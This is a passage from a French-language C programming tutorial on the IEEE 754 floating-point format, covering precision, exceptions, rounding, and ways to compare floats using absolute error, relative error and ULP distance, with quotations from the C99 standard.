1{,}0101905\\times10&#94;{-39}\\end{aligned}]$ Là aussi, on retrouve bien le nombre de départ. Intervalle entre les nombres en fonction de l'exposant Selon la norme IEEE 754, les nombres consécutifs de même exposant (qu'ils soient normalisés ou pas) sont « placés » à intervalle régulier . En effet, pour passer d'un nombre au nombre suivant, on ajoute toujours $\\delta = 0{,}00000000000000000000001 \\times2&#94;{exposant} = \\frac{1}{2&#94;m} \\times2&#94;{exposant} = 2&#94;{exposant-m}$. Cet intervalle double quand on passe d'un exposant à l'exposant supérieur. Quelques valeurs remarquables pour un float (ne les apprenez pas !) : $2&#94;{-126 - 23} = 2&#94;{-149} \\approx 1,40 ×10&#94;{-45}$ : écart entre les nombres dénormalisés et les premiers nombres normalisés (et valeur du tout premier nombre dénormalisé) ; $2&#94;{0 - 23} \\approx 1,19 ×10&#94;{-7}$ : écart entre les nombres normalisés compris entre 1 et 2 ; $1$ : écart entre les nombres normalisés d'exposant non-décalé 23 ; $2&#94;{127 - 23} \\approx 2,03 ×10&#94;{31}$ : écart entre les plus grands nombres normalisés. Précision et chiffres significatifs Vous aurez remarqué une colonne « chiffres significatifs » dans le premier tableau. C'est ce dont on va parler ici. Mais qu'est-ce qu'un chiffre significatif ? Le nombre de chiffres significatifs d'un nombre, c'est tout simplement le nombre de chiffres utilisés pour écrire ce nombre (dans une base numérique donnée). Par exemple, 43,1337 a 6 chiffres significatifs. En physique et en chimie, on y voue une attention particulière. En effet, les mesures n'étant jamais exactes, on s'en sert pour indiquer le degré de précision de la mesure (qui varie selon les instruments). En conséquence, pour un physicien, 42,1337 est différent de 42,13370 ; le second nombre est plus précis, car il indique quel est le $5&#94;e$ chiffre après la virgule tandis que le premier nombre s'arrête au $4&#94;e$ (le $5&#94;e$ chiffre pourrait être 0, 1, 2, 3, 4, on n'en sait pas plus). On compte les chiffres significatifs à partir du premier chiffre de gauche différent de 0, ce qui signifie que 3,1416 et 003,1416 sont équivalents (ils ont tous les deux 5 chiffres significatifs). Vous pouvez maintenant comprendre la colonne du tableau : elle indique le nombre de chiffres significatifs en base 10 que nous permet chaque format : le format 32 bits garantit grosso modo 7 chiffres significatifs en base 10 ; le format 64 bits garantit grosso modo 16 chiffres significatifs en base 10. Maintenant, contrôle surprise : combien de chiffres significatifs en base 2 permettent ces formats ? Mais si, vous pouvez tout à fait répondre, réfléchissez un peu. C'est tout simple : la mantisse représentant la partie significative du nombre, un nombre flottant a autant de chiffres significatifs en base 2 que sa mantisse occupe de bits. Hmm hmm. Vous êtes certain ? N'oubliez pas le bit implicite ! Il faut donc ajouter 1 à ce nombre. En vérité, un nombre normalisé a donc $m+1$ chiffres significatifs en binaire , soit 23+1=24 pour le format 32 bits, ou 52+1=53 pour le format 64 bits. On appelle souvent le nombre de chiffres significatifs en base 2 la précision tout court. Mais ce n'est pas aussi simple ! Cette « formule » pour la précision n'est valable que pour les nombre normalisés. Voyez-vous pourquoi ? Rappelez-vous que pour les nombres dénormalisés, le bit implicite, c'est-à-dire la partie entière du nombre, est 0. Comme c'est le premier chiffre, on ne le compte pas dans les chiffres significatifs. Ah bah alors, pour un nombre dénormalisé, la précision c'est juste le nombre de bits de la mantisse ? Que nenni, jeune padawan. Un court schéma vaut mieux que de longues explications. Comme vous le voyez, plus un nombre dénormalisé est proche de zéro, moins il est précis. IEEE 754 : Exceptions & arrondis Après deux chapitres de théorie pure sur le codage en mémoire d'un flottant, il est peut-être temps de changer de sujet, non ? La norme IEEE 754 ne se contente pas de décrire ce codage ; elle définit également des exceptions et des modes d'arrondis. Voyons ça. Les exceptions Une exception est une sorte de « signal qui est envoyé dans certains cas, afin de traiter les cas particuliers qui, s'ils étaient ignorés, seraient des erreurs. Cette définition est en fait générale (le terme vous est peut-être familier si vous faites du C++). C'est encore flou pour vous ? Ça ne fait rien, vous allez mieux comprendre avec cette liste. IEEE définit cinq exceptions : invalid operation (opération invalide) : se produit lorsqu'une opération interdite est effectuée ; le résultat du calcul en question sera NaN ; division by zero (division par zéro) : se produit lorsqu'on tente de diviser un nombre (non nul) par zéro ; le résultat sera ± \\infty ; overflow : se produit lorsque le résultat d'un calcul est trop grand (en valeur absolue) pour être stocké ; on arrondit à ± \\infty ; underflow : se produit lorsque le résultat d'un calcul est trop petit (en valeur absolue) pour être stocké ; on arrondit à zéro ; inexact : se produit lorsqu'on effectue un autre arrondi pour pouvoir stocker un nombre flottant (parce que le résultat a plus de chiffres significatifs qu'on peut en stocker). Les arrondis C'est là que ça devient intéressant (enfin ça l'était déjà avant, c'est une façon de parler, n'est-ce-pas). Les imprécisions s'accumulent au fil des calculs, et au final vous pouvez obtenir quelque chose d'incohérent ! Ces imprécisions se manifestent par exemple lorsqu'on manipule deux nombres dont les exposants sont très éloignés. Par exemple, $4.2e17 + 13.37$ devrait donner $42000000000000001337$ soit $4.2000000000000001337e17$, mais il y a plus de chiffres significatifs qu'on ne peut en stocker ; le nombre sera donc arrondi, et finalement il vaudra $4.2e17$ comme si l'opération n'avait pas eu lieu ! Certains opérateurs entraînent beaucoup d'arrondis, comme l'addition ou la soustraction. Au contraire, d'autres, tels la multiplication ou la division, sont beaucoup plus sûrs. L'exemple précédent devrait vous aider à comprendre pourquoi. Autre source de problèmes : comme vu précédemment, tous les nombres décimaux ne sont pas représentables de façon finie en binaire, et certains (comme $1.0/10.0 = .1$) sont donc arrondis. Enfin, et en conséquence de ce qui vient d'être dit : Mewtow : Les opérations avec les flottants ne sont pas associatives : l'ordre dans lequel on fait un calcul change le résultat. Par exemple, 1 - (.2 + .2 + .2 + .2 + .2) aura un résultat différent de (((((1-.2)-.2)-.2)-.2)-.2) . Pas convaincus ? Vérifions ça ! #include <stdio.h> int main ( void ) { printf ( \"%g \\n %g \\n \" , ( 1.0 - .2 - .2 - .2 - .2 - .2 ), ( 1.0 - ( .2 + .2 + .2 + .2 + .2 )) ); return 0 ; } Compilé chez moi, j'obtiens ceci : 5.55112e-017 0 Ça parle tout seul. Remarque hors-sujet (mais importante) De façon plus générale, il faut rester vigilant lorsqu'on écrit des expressions impliquant des flottants, car des expressions a priori équivalentes, du point de vue d'un humain, se révèlent en fait différentes en pratique. L'exemple précédent l'illustre bien. D'autres cas parlants sont imaginables. Il y a pas mal de cas où ce qui change d'une expression à l'autre est le signe du zéro obtenu. Par exemple, x-y et -(y-x) ne sont pas équivalents car si les deux nombres sont égaux, alors la première expression donne +0.0 mais la deuxième -0.0. Il y a aussi des cas où les expressions ne sont pas équivalentes si on considère les valeurs « spéciales » des nombres, à savoir zéro, l'infini ou NaN : x - x ne vaut pas 0.0 si x vaut l'infini ou NaN ; 0 * x ne vaut pas 0.0 si x vaut -0.0, l'infini ou NaN ; x / x ne vaut pas 1.0 si x vaut zéro, l'infini ou NaN ; x == x est faux si x vaut NaN ; :euh: x != x est vrai si x vaut NaN. Cette liste est tirée de la norme C99 (ISO/IEC 9899:TC3), que je vous invite à consulter si vous en voulez une plus complète (localisation dans le draft PDF de la norme : Annex F — F.8.2 Expression transformations & F.8.3 Relational operators (p. 464-466) ). L'environnement des flottants : Cet ensemble de paramètres (les exceptions et le mode d'arrondi) forme ce qu'on appelle en informatique (c'est une définition générale) un environnement . C'est le cadre dans lequel on travaille. Cet environnement pour les flottants est accessible avec le header standard (C99) <fenv.h> . Il permet de manipuler les exceptions (les surveiller, en lever, etc.) et les modes d'arrondis (savoir quel est le mode utilisé et en changer). Je ne détaillerai pas son utilisation. Si vous voulez en savoir plus, consultez (par exemple) cette page Wikipédia ou cette page du site d'Open Group . Comparer des nombres flottants L'infâme traîtrise de l'opérateur == Bon. On a donc vu que l'utilisation des flottants en C est semée d'embûches : on risque des arrondis et des expressions « normalement » équivalentes ne le sont pas. Mais ce n'est pas tout ! Les comparaisons vont aussi vous donner du fil à retordre. En effet, l'opérateur de comparaison == renvoie vrai si ses deux opérandes sont EXACTEMENT égales , ou s'il compare un zéro positif et un zéro négatif. Or, avec les problèmes d'arrondis, une différence minuscule peut s'être glissée entre les deux nombres testés. Ainsi, vous risquez de vous retrouver avec des égalités qui devraient être vraies, mais qui sont fausses ! Cela peut faire planter lamentablement un programme (boucles infinies, instructions dans un bloc conditionnel jamais exécutées, etc) et la source du problème est difficilement identifiable pour un œil non averti. Un petit exemple ? 4.2e17 == 4.2e17 + 13.37 renverra vrai (d'après l'exemple précédent). Autre exemple : int main ( void ) { float f = 0 ; int i ; for ( i = 0 ; i < 100 ; ++ i ) f += .01 ; if ( f == 1 ) printf ( \"f==1 \\n \" ); else printf ( \"f!=1, f==%f\" , f ); return 0 ; } La sortie sera : f!=1, f==0.999999. Évidemment, ces exemples sont stupides, mais ils permettent de mieux saisir dans quels cas se pose ce problème. Les utilisateurs de GCC seront intéressés de savoir qu'il existe une option -Wfloat-equal qui déclenche un warning dès que l'on utilise l'opérateur == sur des nombres flottants. Vous : Argghh ! mais c'est abominable ! Hé oui, c'est horrible. Vous pouvez encore renoncer à l'informatique et vous mettre au patchwork. Non, revenez ! Il y a un truc ! La suite est fortement inspirée de cette page Internet (en anglais). Elle est complète et détaillée et je vous invite à la lire, car je n'aborderai pas forcément tout ce qu'elle dit (mais y ajouterai quelques broutilles de mon cru). Alors, récapitulons : on cherche à comparer deux nombres à virgule flottante ( float ou double ) en tenant compte d'une marge d'erreur due aux arrondis ; on va pour cela écrire une fonction qui renverra un booléen (vrai ou faux, 1 ou 0), pour remplacer l'opérateur ==. L'écart absolu & l'écart relatif La première méthode consiste tout simplement à mesurer l'écart entre les deux nombres. On parle d' écart absolu (par opposition à l'écart relatif que nous verrons par la suite). Si cet écart est inférieur à une certaine valeur (souvent appelée epsilon, ce qui pour un mathématicien signifie « valeur très petite »), alors on considère que les deux nombres sont égaux. #include <math.h> // pour la fonction fabs, renvoyant la valeur absolue d'un flottant #define EPSILON 1e-8 /* ici pour des doubles, mais on fait la même chose pour des floats */ int doublesAreEqual ( double a , double b ) { return fabs ( a - b ) <= EPSILON ; /* La fonction fabs renvoie la valeur absolue (c'est-à-dire positive) du nombre de type double passé en argument ; ses équivalents (C99) sont fabsf pour les float, et fabsl pour les long double (pensez donc à adapter votre code en conséquence pour comparer les autres types flottants). */ } Ici, fabs nous renvoie l'écart absolu entre a et b. Le reste est facile à comprendre. Simple, non ? Oui, mais c'est encore loin d'être parfait : en effet, un écart de $1e-8$ (soit $0.00000001$) peut s'avérer judicieux pour comparer des nombres compris entre 0,1 et 1 (par exemple, en fonction de la précision que vous souhaitez), mais trop petit pour des nombres entre 100 et 1000, ou trop grand pour des nombres entre 0,00001 et 0,0001 ; si vous comparez des nombres compris entre 0,00000001 et 0,0000001, vous avez même une marge d'erreur de 100% ! N'employez donc cette méthode que si vous êtes sûr de l'ordre de grandeur des nombres à comparer, et choisissez un epsilon adapté. Pour pallier à ce problème et faire une fonction plus générique, une solution serait de passer l'écart maximal en argument à la fonction et non de se baser sur une constante de préprocesseur ; ainsi, l'utilisateur pourrait fournir un écart adapté à l'ordre de grandeur des nombres qu'il veut comparer. Allons plus loin. On va employer l' écart relatif . Celui-ci ramène l'écart absolu dans les proportions des nombres comparés : #include <math.h> #define EPSILON 1e-8 int doublesAreEqual ( double a , double b ) { if ( a == b ) return 1 ; // si a et b valent zéro (explications plus bas) double absError = fabs ( a - b ); // écart absolu a = fabs ( a ); // on ne garde que les valeurs absolues pour la suite … b = fabs ( b ); // … pour pouvoir calculer le nombre le plus grand en valeur absolue return ( absError / ( a > b ? a : b ) ) <= EPSILON ; } On divise l'écart absolu par le plus grand des deux nombres en valeur absolue (signification du ternaire), pour avoir quelque chose d'adapté à l'ordre de grandeur des deux nombres. La ligne commençant par if (a == b) vous paraît sans doute bizarre. Elle est là pour gérer le cas où a et b sont égaux à zéro. En effet, sans elle, on aurait une division par zéro qui vaudrait NaN, et la comparaison serait donc toujours fausse. On compare donc les deux nombres pour que la fonction renvoie vrai s'ils sont identiques et égaux à zéro (positif ou négatif). Remarque : Dans ce tutoriel, j'utilise le C99. Celui-ci autorise de déclarer des variables après des instructions. Si c'était juste pour ce détail, ce serait superflu, mais plus loin on en aura réellement besoin. Cependant, il subsiste un problème : dans le cas de deux nombres très proches de zéro, l'écart relatif sera très important (car on divise par un tout petit nombre) alors que ces deux nombres seront très proches ... Pour y remédier, on réintroduit l'écart absolu : la fonction retournerait vrai si l'écart absolu ou l'écart relatif (au moins l'un des deux) est inférieur à une valeur donnée (qu'on passe en argument à la fonction). D'où le code définitif : #include <math.h> #define EPSILON 1e-8 int doublesAreEqual ( double a , double b , double maxAbs , double maxRel ) { if ( a == b ) return 1 ; double absError = fabs ( a - b ); a = fabs ( a ); b = fabs ( b ); return absError <= maxAbs || ( absError / ( a > b ? a : b ) ) <= maxRel ; } La représentation en mémoire convertie en entier Maintenant, vous avez du code à peu près potable et fonctionnel. Toutefois, il existe une autre manière de faire, plus pratique mais un peu plus hard . Accrochez-vous, ça va secouer. Imaginez qu'au lieu de se baser sur l'écart entre les deux nombres, on cherche à déterminer combien de nombres possibles les séparent ? Ainsi, on aimerait placer une marge d'erreur, non sur la valeur elle-même des nombres flottants, mais sur leur « éloignement », pour pouvoir dire par exemple : « J'accepte les 5 nombres en dessous et les 5 nombres au dessus de la valeur machin ». Eh bien, grâce au format de l'IEEE, c'est possible ! Ici, on a donc impérativement besoin du format IEEE 754 ! L'astuce présentée est basée dessus. Si jamais ce n'est pas ce format que vous avez chez vous, vous ne pourrez sans doute pas la mettre en œuvre. Toutefois, je vous invite à lire quand même ce qui suit, cela pourra peut-être vous intéresser ; et en tous cas, jetez un œil au code complet (dernière sous-partie), car j'y présente des idées qui pourront vous intéresser même si vous utilisez l'écart absolu/relatif. Ce format garantit que « si deux nombres du même type à virgule flottante sont consécutifs, alors leurs représentations entières le sont aussi (selon le bit de poids fort pour déterminer le signe, et non la règle du complément à 2). » Que signifie ce charabia ? Eh bien, prenons 2 nombres de type float codés sur 32 bits selon le format IEEE 754 (évidemment, cela s'applique aussi aux double ) : Valeur du float représentation en mémoire binaire hexadécimal en base 10 +1.9999998 0 0111111 1 1111111 11111111 11111110 3F FF FF FE 1073741822 +1.9999999 0 0111111 1 1111111 11111111 11111111 3F FF FF FF 1073741823 Ces 2 nombres sont « consécutifs », il ne peut pas y avoir d'autre nombre du même type dont la valeur serait comprise entre les 2. Or, que constate-t-on ? Leurs représentations en mémoire, si on les lit comme des nombres entiers , sont également consécutives ! Pour savoir si les deux nombres à comparer sont « voisins », il suffit donc de comparer leur représentation en mémoire convertie en nombre entier. Par la suite, je dirais (abusivement, certes) « représentation entière » plutôt que « représentation en mémoire lue comme un entier », c'est quand même plus court. Mais comment accéder à cette représentation entière ? Ben, c'est simple, il suffit de faire (int) monFloat … Surtout pas ! En faisant ça, on convertit le nombre à virgule en nombre entier, et on obtient donc le nombre de départ arrondi à l'unité. Ça n'a rien à voir avec ce que l'on veut. La bonne formule est donc, tenez-vous bien : * ( int * ) & monFloat Je vous laisse méditer là-dessus. Ce n'est pas vraiment compliqué, quand on y pense. Quelques explications si vraiment vous bloquez : [secret]{ Pour comprendre cette expression, il faut en fait la lire de droite à gauche : &monFloat renvoie l'adresse de la variable de type float , donc un pointeur sur float ; (int*) convertit ce pointeur sur float en un pointeur sur int ; ainsi, l'ordinateur considérera la variable pointée comme un int et non plus comme un float ; et hop ! le tour est joué, il ne nous reste plus qu'à déréférencer ce pointeur avec * pour accéder à la variable pointée. } Maintenant, du code avec ce que je viens de vous dire : #include <stdlib.h> // pour la fonction abs, renvoyant la valeur absolue d'un entier #include <stdint.h> /* header du C99, qui fournit des types entiers de taille fixe : — int32_t , int64_t : entier signé de 32 ou 64 bits ; — uint32_t , uint64_t : entier non - signé de 32 ou 64 bits . */ #define INTREPOFFLOAT(f) ( *(int32_t*)&(f) ) // représentation entière d'un float (32 bits) #define INTREPOFDOUBLE(d) ( *(int64_t*)&(d) ) // représentation entière d'un double (64 bits) #define MAXULPS 5 /* ici pour des floats, mais on fait exactement pareil pour des doubles */ int floatsAreEqual ( float a , float b ) { if ( a == b ) return 1 ; return abs ( INTREPOFFLOAT ( a ) - INTREPOFFLOAT ( b ) ) <= MAXULPS ; /* attention à la fonction abs, qui prend un int en argument ; un int fait 16 ou 32 bits : il peut donc être trop petit pour contenir les 32 bits de la représentation entière d'un float, et sera de toutes façons insuffisant pour les 64 bits de celle d'un double. Voyez la fonction labs qui prend un long int, ou llabs (C99) qui prend un long long int, ou mieux, écrivez vos propres fonctions de valeur absolue, pour 32 et 64 bits (avec les types de <stdint.h>) ; ainsi, vous n'aurez plus de problèmes de taille des types pouvant varier. Ici, je garde les fonctions standards par souci de clarté. */ } La constante MAXULPS (de ULP, « Unit of Least Precision », c'est-à-dire la valeur qui sépare deux flottants consécutifs) nous fournit notre marge d'erreur. Si l'écart entre les représentations entières est inférieur à MAXULPS, alors on considère que les nombres sont égaux. Ici, la ligne commençant par if (a == b) est là pour gérer le cas où les deux nombres seraient +0.0 et -0.0. En effet, +0.0 et -0.0 ont des représentations entières très différentes, ce qui fait que la fonction retournerait faux sans ce test préalable. En outre, remarquez qu'on utilise les types entiers définis dans le header standard <stdint.h> au lieu des types habituels ( int , long int , etc). En effet, la taille de ces derniers dépend de l'implémentation et n'est donc pas connue, il serait donc dangereux (non portable) de s'appuyer dessus ; au contraire, la taille de int32_t et int64_t est connue et fixe. Ce header a été introduit avec C99, c'est pourquoi je vous ai dit qu'on allait devoir se baser sur cette version du langage C. Un peu de maths pour vous aider à choisir votre marge d'erreur ! Une variation de $\\Delta mantisse$ dans la représentation entière de la mantisse codée sur $m$ bits correspond à une variation de la valeur du flottant donnée par la formule suivante : $\\Delta flottant = \\frac{\\Delta mantisse}{2&#94;m} \\times 2&#94;{exposant} = \\Delta mantisse \\times 2&#94;{exposant-m}$ (où $exposant$ est l'exposant réel). Cette formule provient directement de celle donnant l'intervalle entre les nombres consécutifs en fonction de l'exposant. Pour un nombre flottant compris entre 1 et 2, une variation d'un ULP correspond donc à une variation de valeur du nombre flottant de $\\frac{1}{2&#94;{23}} \\approx 1{,}192\\times10&#94;{-7}$ pour un float et $\\frac{1}{2&#94;{52}} \\approx 2{,}220\\times10&#94;{-16}$ pour un double . Si vous choisissez comme moi une marge de 5 ULP, alors votre marge de valeur (pour un nombre flottant compris entre 1 et 2) sera $\\frac{5}{2&#94;{23}} \\approx 5{,}960\\times10&#94;{-7}$ pour un float et $\\frac{5}{2&#94;{52}} \\approx 1{,}110\\times10&#94;{-15}$ pour un double . Mais (hé oui, encore un « mais ») il reste encore un détail à régler, et à ce stade j'aimerais que vous leviez tous la main pour me le dire. Allez, un indice : ça concerne la parenthèse de la phrase en italique de tout à l'heure ... Ben oui, le signe ! Les flottants, selon la norme IEEE 754, sont signés selon le principe du bit de signe et non du complément à 2. Or, les entiers (du moins sur la grande majorité des ordinateurs aujourd'hui) sont stockés… selon la règle du complément à 2. Un exemple pour bien voir (je ne vous met plus le binaire, vous êtes grands maintenant) : Valeur du float représentation en mémoire hexadécimal en base 10 selon le complément à 2 +4.2038954 e-45 00 00 00 03 3 +2.8025969 e-45 00 00 00 02 2 +1.4012985 e-45 00 00 00 01 1 +0.0000000 00 00 00 00 0 -0.0000000 80 00 00 00 -2147483648 -1.4012985 e-45 80 00 00 01 -2147483647 -2.8025969 e-45 80 00 00 02 -2147483646 -4.2038954 e-45 80 00 00 03 -2147483645 Comme vous le voyez, le dernier nombre est inférieur à l'avant-dernier, et pourtant sa représentation entière (en signed comme en unsigned ) est supérieure ! En vérité, cela ne porte pas à conséquence si l'on compare deux nombres négatifs, car on ne s'intéresse qu'à l'écart entre les représentations entières, qui lui ne change pas ; le problème se pose lorsque l'on compare deux nombres de signes opposés. Heureusement, il existe une solution. Il suffit de convertir les nombres négatifs selon la règle du bit de signe, en nombres négatifs selon la règle du complément à 2. Je vous laisse chercher ; aidez-vous de l'exemple ci-dessus. Trouvé ? Il suffit de garder la valeur telle quelle si le flottant est positif, ou s'il est négatif de soustraire $0x 80 00 00 00$ à la représentation entière puis d'inverser le signe de cette représentation. Cela revient à faire l'opération suivante : représentation = 0 x 8000 0000 - représentation ; Similairement, pour un double de 64 bits, on fera représentation = 0x 8000 0000 0000 0000 - représentation; . On obtient alors ceci : Valeur du float représentation transformée hexadécimal en base 10 selon le complément à 2 +4.2038954 e-45 00 00 00 03 3 +2.8025969 e-45 00 00 00 02 2 +1.4012985 e-45 00 00 00 01 1 +0.0000000 00 00 00 00 0 -0.0000000 00 00 00 00 0 * (* = a été transformé) -1.4012985 e-45 FF FF FF FF -1 * -2.8025969 e-45 FF FF FF FE -2 * -4.2038954 e-45 FF FF FF FD -3 * Comme vous le voyez, les représentations entières sont maintenant cohérentes, on peut les comparer sans problème. Et même les deux zéros (positif et négatif) sont égaux ! #include <stdlib.h> #include <stdint.h> #define INTREPOFFLOAT(f) ( *(int32_t*)&(f) ) #define INTREPOFDOUBLE(d) ( *(int64_t*)&(d) ) #define MAXULPS 5 int floatsAreEqual ( float a , float b ) { int32_t aInt = INTREPOFFLOAT ( a ); // représentations entières int32_t bInt = INTREPOFFLOAT ( b ); if ( aInt < 0 ) aInt = 0x80000000 - aInt ; // ou 0x8000000000000000 pour des doubles if ( bInt < 0 ) bInt = 0x80000000 - bInt ; /* NOTE: on teste (aInt<0) et non (a<0). En effet, si a==-0.0 (zéro négatif), alors le test (a<0) renverrait faux, et on garderait la représentation de -0.0, à savoir 0x80000000. La règle du complément à 2 garde l'avantage du bit de signe : si le bit de poids fort est à 1, alors le nombre entier est négatif, et réciproquement ; on peut donc utiliser le test sur l'entier et non sur le flottant pour savoir s'il faut « transformer » la représentation. */ return abs ( aInt - bInt ) <= MAXULPS ; } Attention à bien utiliser les types signés ( int32_t et int64_t ) et non les non signés ( uint32_t et uint64_t ). Bon, ce n'est pas encore parfait, mais c'est très convenable. Quelques points améliorables : les infinis : comme vu précédemment, les infinis sont adjacents aux plus grands nombres en valeur absolue. Notre fonction pourrait par exemple nous dire qu'un nombre positif très très très grand et $+\\infty$ sont égaux, alors que ce n'est pas vrai (ne discutez pas, d'un point de vue mathématique c'est faux) ; les NaN : de même, certains NaN pourraient être comparés comme égaux à l'infini ou à un nombre extrêmement grand en valeur absolue, voire à un autre NaN. Or, normalement, n'importe quelle comparaison avec un NaN (hormis !=) devrait valoir faux. Ces détails peuvent être corrigés avec des vérifications supplémentaires. À ce sujet, les macros de test de nombres flottants (C99) peuvent servir. En résumé (je vous invite à consulter le manuel avec le lien précédent) : Le manuel : fpclassify, isfinite, isnormal, isnan, isinf Depuis le C99, le header définit les macros isfinite , isnormal , isnan et isinf ; elles prennent toutes un nombre flottant en argument (peu importe son type), et renvoient un booléen indiquant respectivement si le nombre est fini, normalisé, NaN ou infini (le retour de isinf n'est pas forcément 1 ou 0). La macro fpclassify est également définie. On l'utilise comme les autres, et sa valeur de retour indique le type du nombre flottant (FP_ZERO, FP_SUBNORMAL, FP_NORMAL, FP_INFINITE, FP_NAN). Code complet Je vous propose finalement un code complet. J'y ai introduit une fonction cmpFloats (ou cmpDoubles ) de mon cru qui permet une comparaison plus générale : en effet, à la manière de strcmp , elle renvoie -1 si a > b, 0 si a == b ou 1 si a < b ; elle renvoie par ailleurs -2 si l'un des deux nombres au moins est NaN. Ainsi, il devient plus facile de tester les deux nombres (j'ai de plus écrit des macros simples pour faciliter les comparaisons). En effet, avant, pour tester par exemple a<b (strictement inférieur), il fallait faire if (a < b && !floatsAreEqual(a, b)) , ce qui était plus lourd à écrire. En-tête Code disponible à cette adresse . Remarquez que j'ai mis des macros en commentaires (correspondant à <= et >=), qui on été remplacées par d'autres. En effet, ces macros ne sont plus valables si cmp… renvoie -2 (qui est le code pour NaN). Les macros CMP…_GTEQUAL de remplacement sont très bizarres. En fait, c'est une astuce que j'ai trouvé pour éviter quelque chose du type (cmpFloats((a), (b)) ==-1 || cmpFloats((a), (b)) == 0) , ce qui est dangereux car a et b sont potentiellement évalués 2 fois, et non optimisé car on appelle 2 fois la fonction cmp. En fait, les seules macros qui renverront vrai en cas de NaN seront CMP…_NAN et CMP…_UNEQUAL. L'utilisation de ces macros est conseillée dans le cas d'un test « simple », c'est-à-dire avec un seul test ; par exemple : instructions1 ; if ( CMPFLOATS_GT ( a , b )) { // a>b instructions2 ; } instructions3 ; En revanche, il vaut mieux éviter de les enchaîner pour traiter différentes possibilités (si a < b, faire machin, si a > b, faire truc...) le else est aussi à éviter (car il engloberait aussi le cas de NaN, ce qui dans la plupart des cas n'est pas voulu) : instructions1 ; if ( CMPFLOATS_GT ( a , b )) { // a > b instructions2 ; } else if ( CMPFLOATS_LT ( a , b )) { // a < b /* /!\\ on appelle la fonction cmpFloats 2 fois */ instructions2b ; } else // a == b { instructions2t ; /* /!\\ ce code est aussi exécuté dans le cas de NaN ! */ } instructions3 ; Il vaut mieux utiliser un switch dans ce cas, qui n'appelle la fonction qu'une seule fois tout en permettant un contrôle précis : instructions1 ; switch ( cmpFloats ( a , b )) { case - 1 : // a > b instructions2 ; break ; case 0 : // a == b instructions2t ; break ; case 1 : // a < b instructions2b ; break ; default : break ; // NaN } instructions3 ; Autre exemple pour bien saisir l'utilisation du switch : instructions1 ; switch ( cmpFloats ( a , b )) { case - 1 : // a > b case 0 : // a == b instructions2 ; // ce code est donc exécuté si a >= b break ; case 1 : // a < b instructions2b ; break ; default : break ; // NaN } instructions3 ; Fichier source Fichier disponible à cette adresse . Ce code est à compiler en C99. Si vous programmez en C++, pourquoi ne pas surcharger les opérateurs de comparaison ? Cela vous simplifiera la vie (toutefois, vous risquerez alors, à la longue, d'oublier que vous avez fait quelque chose pour comparer tranquillement des flottants, et un jour ça ne marchera plus car vous n'aurez plus inclus votre petit header magique.) Mais qu'en dit la norme C ? Rassurez-vous, si vous êtes fatigués, vous pouvez passer cette partie. Elle se destine aux petits curieux qui voudraient aller plus loin pour savoir plus précisément quelle relation entretient IEEE 754 vis à vis de la norme C, et comment déterminer si le compilateur suit bien les formats IEEE 754 ou pas. Car en C, il y a foule de gourous barbus qui se cramponnent à la norme comme une huître à son rocher, la citent comme un texte sacré, et viennent hurler à l'hérésie au moindre bout de code non « portable ». Et ils ont bien raison. IEEE 754 et la norme C La norme C90 était très floue sur ce sujet, et n'imposait ni ne privilégiait aucun format pour les nombres à virgule flottante. Le C99 a changé cela. En effet, la norme C99 (alias ISO/IEC 9899:TC3, téléchargeable ici en PDF) introduit le support de la norme IEEE 754. Voici un extrait le montrant (issu de la liste des changements majeurs depuis le C90) : ISO/IEC 9899:TC3 — Foreword (§5, p. xi-xii) This second edition cancels and replaces the first edition, ISO/IEC 9899:1990 […]. Major changes from the previous edition include: […] — IEC 60559 (also known as IEC 559 or IEEE arithmetic) support […] Quoi ? C'est quoi IEC 60559 ? Encore une nouvelle norme au nom tordu ! Oulala, pas de panique ! IEC 60559, c'est juste un autre nom de IEEE 754. Cette norme est donc supportée par le langage C depuis sa version C99 . Attention ! Supportée ne veut pas dire imposée. Les compilateurs ne sont pas obligés d'adopter les formats IEEE 754. C'est juste que s'ils le font, ils doivent suivre les règles de support spécifiées par la norme C99. Ce passage le montre clairement : ISO/IEC 9899:TC3 — 6.2.6: Representation of types — General (§1, p.37) The representations of all types are unspecified except as stated in this subclause. […] Cela signifie que la représentation de n'importe quel type (et pas seulement les flottants) est inconnue ; elle reste aux choix du compilateur. Certains compilateurs peuvent supporter plusieurs formats ; dans ce cas, vous devrez spécifier lequel utiliser avec des arguments (sauf si vous voulez garder le format par défaut). GCC, pour sa part, implémente IEEE 754 par défaut, ses utilisateurs peuvent donc dormir sur leurs deux oreilles. Mais quelles sont les règles de support de IEEE 754 selon le C99 ? La norme C99 comporte une annexe (l'annexe F) dédiée aux nombres flottants, où se trouve la réponse à cette question. En voici le début : ISO/IEC 9899:TC3 — Annex F (normative): IEC 60559 floating-point arithmetic (p.444) F.1 Introduction This annex specifies C language support for the IEC 60559 floating-point standard. […] An implementation that defines STDC_IEC_559 shall conform to the specifications in this annex. […] F.2 Types The C floating types match the IEC 60559 formats as follows: — The float type matches the IEC 60559 single format. — The double type matches the IEC 60559 double format. — The long double type matches an IEC 60559 extended format, else a non-IEC 60559 extended format, else the IEC 60559 double format. Any non-IEC 60559 extended format used for the long double type shall have more precision than IEC 60559 double and at least the range of IEC 60559 double. Recommended practice The long double type should match an IEC 60559 extended format. […] La deuxième partie dit que le type float du langage C doit correspondre au format simple précision (32 bits) de IEC 60559 (alias IEEE 754), etc. Il est aussi question du type long double , dont j'ai peu parlé dans ce tutoriel ; sachez qu'en C, son format est moins bien défini, mais qu'il correspond souvent au format de double précision étendue de IEEE 754 (dont je n'ai pas parlé non plus), ou alors au format de double précision tout court (comme un double ). Je ne parlerai pas de la suite de cette annexe, vous pouvez la lire si vous voulez (vous êtes grands). Elle décrit notamment le comportement des opérations sur les flottants. Enfin, sachez que : Taurre un système peut visiblement encoder les nombres flottants suivant le format défini par la norme IEEE 754, sans pour autant remplir toutes les conditions de l'annexe F de la norme C99 ( cf ce sujet ). Les conditions en questions sont surtout des détails du comportement des calculs. Dans le cadre de ce tutoriel, qui s'est surtout focalisé sur les formats de représentation des flottants, ça ne devrait pas poser trop de problèmes. Le non-respect partiel de la norme IEEE 754 peut aussi être le fait d'options du compilateur. Par exemple, l'option d'optimisation -ffast-math de GCC améliore les performances en accélérant les calculs sur les nombres flottants, mais enfreint certaines règles de IEEE 754. Je reviens sur l'introduction, elle contient quelque chose d'intéressant. Il est dit que si la macro STDC_IEC_559 est définie, alors c'est le format IEEE 754 qui est utilisé. Cela peut vous être utile pour faire des tests ou adapter votre code. Cependant, le contraire n'est pas vrai ! Vous pouvez parfaitement avoir une implémentation qui suit IEEE 754 mais qui ne définit pas cette constante. Cela semble être le cas de GCC sous Windows (portage MinGW par 